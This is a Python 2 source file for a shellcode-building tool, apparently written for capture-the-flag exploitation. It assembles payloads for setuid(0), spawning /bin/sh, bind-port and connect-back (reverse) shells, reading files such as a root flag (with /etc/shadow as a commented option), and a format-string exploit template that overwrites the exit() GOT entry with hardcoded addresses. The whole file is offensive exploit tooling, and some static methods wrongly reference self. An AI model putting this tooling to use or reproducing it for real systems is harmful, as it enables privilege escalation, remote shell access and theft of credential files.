from init_regs import *
from setuid import *
from setgid import *
from execve import *
from bind_port import *
from connect_back import *
from readfile import *
from out_format import *
from format_exploit_template import *

##########################################################

IP = '127.0.0.1'
PORT = 44444

#BIN_FILE = '/bin/cat'
#PARAMETERS = ['/etc/shadow']
BIN_FILE = '/bin/sh'
PARAMETERS = []

READ_FILE = '/root/Desktop/flag'
R_SIZE = 0x101
STDOUT = 1
FD = STDOUT

UID = 0
GID = 0
ALIGN = 4

##########################################################
LANGUAGE = 'c'
OUTPUT = ''
##########################################################

class ShellcodeLoader(object):

	code = ''

	def __init__(self):
		print "Shellcode-Shellcode-Shellcode-Shellcode"
		pass


	@staticmethod
	def init_regs():
		ShellcodeLoader.clear()
		ShellcodeLoader.code += init_regs_shellcode()
		return ShellcodeLoader.code

 	@staticmethod
	def setuid(uid = UID):
		if isinstance(uid,(int,long)):
			ShellcodeLoader.code += setuid_shellcode(uid)
			return ShellcodeLoader.code


 	@staticmethod
	def setgid(gid = GID):
		if isinstance(gid,(int,long)):
			ShellcodeLoader.code += setgid_shellcode(gid)
			return ShellcodeLoader.code


 	@staticmethod
	def execve(binpath=BIN_FILE, parameters=PARAMETERS ):
		'''shellcode:  execve(BIN_FILE,PARAMETERS)'''
		ShellcodeLoader.code += execve_shellcode(binpath, parameters)
		return ShellcodeLoader.code

 
 	@staticmethod
	def bind_port(bind_ip=IP, bind_port=PORT, payload=''):
		'''shellcode: bind sockert at IP:PORT && execve(payload)'''
		if len(payload) == 0:
			payload = self.execve_shellcode(BIN_FILE, PARAMETERS)
		ShellcodeLoader.code += bind_shellcode(bind_ip, bind_port, payload)
		return ShellcodeLoader.code
 

	@staticmethod
	def connect_back(ip=IP, port=PORT, payload=''):
		'''shellcode: connect to IP:PORT && execve(payload)''' 
		if len(payload) == 0:
			payload = self.execve_shellcode(BIN_FILE, PARAMETERS)
		ShellcodeLoader.code += connect_back_shellcode(IP, PORT, payload)
		return ShellcodeLoader.code


 	@staticmethod
	def readfile(filepath=READ_FILE, r_size=R_SIZE,fd = FD):
		des_format = 'shellcode: readfile(READ_FILE,R_SIZE,FD)' 
		ShellcodeLoader.code += readfile_shellcode(filepath, r_size,fd)
		return ShellcodeLoader.code
 

 	@staticmethod
	def format_exploit_template(overwrite_ip , offset , shellcodeAddr):
		des_format = 'shellcode: format_exploit' 
		ShellcodeLoader.code += formatMaker(overwrite_ip , offset , shellcodeAddr)
		return ShellcodeLoader.code
 


	@staticmethod
	def format_shellcode(language = LANGUAGE):
		if language == 'hex':
			return to_hexstr(ShellcodeLoader.code)
		else:
			return ShellcodeLoader.code

	@staticmethod
	def clear():
		ShellcodeLoader.code = ''

##############################################################


def to_hexstr(str):
	'''Convert a string to hex escape represent'''
	return "".join(["\\x%02x" % ord(i) for i in str])


##########################################################


if __name__ == '__main__':	

	ShellcodeLoader.init_regs()
	ShellcodeLoader.setuid(0)
	print ShellcodeLoader.readfile()
	print ShellcodeLoader.format_shellcode()
	print ShellcodeLoader.format_shellcode(language='bin')
	print ShellcodeLoader.format_shellcode(language='hex')


	ShellcodeLoader.clear()
	exit_got = 0x804a044				# "exit()" address in got
	target_eip = 0x0804888c				# func "yoyo()" in printf
	off = 80/4 - 1 
	print ShellcodeLoader.format_exploit_template(overwrite_ip=exit_got , offset=off , shellcodeAddr=target_eip)
